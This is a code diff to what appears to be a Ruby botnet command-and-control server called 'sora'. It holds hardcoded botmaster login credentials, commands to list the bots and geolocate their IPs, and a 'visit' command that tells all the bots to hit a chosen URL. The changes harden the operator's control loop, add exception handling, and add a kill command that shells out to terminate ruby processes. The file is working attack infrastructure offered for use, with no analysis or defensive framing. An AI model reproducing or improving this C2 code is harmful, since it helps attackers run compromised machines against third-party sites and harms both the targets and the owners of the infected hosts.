@@ -7,6 +7,8 @@ uname = 'botmaster'    # Change this
 password = 'ilovedogs' # Change this
 cmd = ''
 
+# TODO write process id's to file so we can kill them properly
+
 def debug(msg='')
   if ARGV.include?('DEBUG')
     ind = '[!] '.colorize(:yellow)
@@ -75,9 +77,13 @@ loop do
 ".colorize(:red)
 
     master.puts "Made with <3 by AM-77\n\n"
-    while (cmd != 'exit')
+    while (true)
       begin
-        master.print "sora > "
+        begin
+          master.print "sora > "
+        rescue
+          next
+        end
 
         cmd = master.gets
         begin
@@ -125,6 +131,7 @@ loop do
           master.puts "Bye bye!"
           master.close
           cmd = ""
+          break
         elsif cmd == "botlist"
           botlist = File.open("bots.txt", 'r')
           master.puts botlist.read
@@ -136,9 +143,11 @@ loop do
             master.puts "Usage: geolocate <ip>"
           end
         elsif cmd == 'killall'
-          system('pkill ruby')
-          exit
-        elsif cmd.include? "visit" && split.length == 2
+          master.puts "Bye bye!"
+          master.close
+          cmd = ""
+          system('kill $(ps aux | grep \'ruby\' | awk \'{print $2}\')') # | tail -2
+        elsif split[0] == 'visit' && split.length == 2
           sprint_status("Telling bots to visit #{split[1]}", master)
           writeCmd(cmd)
         else
@@ -153,11 +162,13 @@ loop do
         next
       rescue Errno::EADDRINUSE
         puts "Botmaster: Something's listening on port #{ARGV[1]}"
+      rescue Exception => e
+        puts e.message
+        puts e.backtrace
       end
   end
 
   next
 
-end
-print_err("Master disconnected")
-end
+end  # end from Thread.start
+end  # end from loop do
